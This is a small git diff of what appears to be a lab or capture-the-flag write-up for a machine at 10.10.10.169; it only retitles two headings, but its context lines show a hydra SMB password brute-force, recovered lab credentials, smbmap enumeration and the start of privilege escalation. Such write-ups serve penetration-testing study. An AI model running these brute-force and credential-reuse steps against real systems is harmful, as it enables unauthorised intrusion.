@@ -13,7 +13,7 @@ hydra -L names.txt -P password.txt 10.10.10.169 smb
 ```
 
 [445][smb] host: 10.10.10.169   login: melanie   password: Welcome123!
-#user part
+## user part
 so i can connect and enum as melanie with smbclient - smbmap	
 ```bash
 smbmap -u melanie -H 10.10.10.169 -p Welcome123!
@@ -59,7 +59,7 @@ C:\pstranscripts\20191203> gci -H
 
 ryan Serv3r4Admin4cc123!
 
-#root part
+## root part
 from here if we type :
 ```powershell
 whoami /all
